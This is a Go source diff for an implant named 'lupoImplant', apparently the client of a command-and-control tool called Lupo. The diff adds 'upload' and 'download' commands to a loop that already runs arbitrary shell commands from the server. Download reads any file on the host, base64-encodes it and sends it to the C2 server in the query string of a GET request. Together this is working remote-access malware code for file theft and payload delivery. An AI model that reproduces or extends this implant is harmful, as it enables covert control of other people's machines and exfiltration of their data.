@@ -1,8 +1,10 @@
 package main
 
 import (
+	"bufio"
 	"crypto/tls"
 	"crypto/x509"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -32,6 +34,7 @@ type lupoImplant struct {
 var implant *lupoImplant
 
 var rootCert string = `some cert here
+
 `
 
 func main() {
@@ -173,6 +176,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 			var data []byte
 			var dataString string
+			var fileString string
 
 			if err != nil {
 				return
@@ -183,6 +187,45 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 				// Maintain directory context if cd is issued
 				if cmd == "cd" {
 					os.Chdir(strings.Join(argS, " "))
+				} else if cmd == "upload" {
+
+					filename := argS[0]
+
+					fileb64, err := base64.StdEncoding.DecodeString(strings.Join(argS[1:], " "))
+					if err != nil {
+						return
+					}
+
+					f, err := os.Create(filename)
+					if err != nil {
+						return
+					}
+					defer f.Close()
+
+					if _, err := f.Write(fileb64); err != nil {
+						return
+					}
+					if err := f.Sync(); err != nil {
+						return
+					}
+				} else if cmd == "download" {
+					filename := argS[0]
+
+					// Open file on disk.
+					f, err := os.Open(filename)
+
+					if err != nil {
+						return
+					}
+
+					reader := bufio.NewReader(f)
+					content, _ := ioutil.ReadAll(reader)
+
+					// Encode as base64.
+					encoded := base64.StdEncoding.EncodeToString(content)
+
+					fileString = "&filename=" + url.QueryEscape(filename) + "&file=" + url.QueryEscape(encoded)
+
 				} else {
 					data, err = exec.Command(cmd, argS...).Output()
 				}
@@ -196,13 +239,15 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 			// URL encode data from exec output to account for weird characters like newlines in the URL string
 			if dataString == "" {
-				dataString = url.QueryEscape(string(data))
+				if data != nil {
+					dataString = "&data=" + url.QueryEscape(string(data))
+				}
 			} else {
-				dataString = url.QueryEscape(string(dataString))
+				dataString = "&data=" + url.QueryEscape(dataString)
 			}
 
 			// Return a response with our standard auth and include the data parameter with our command output to display in Lupo
-			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&user=" + operator + "&data=" + dataString
+			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&user=" + operator + dataString + fileString
 			requestUrl = connectionString + requestParams
 
 			resp, err = client.Get(requestUrl)
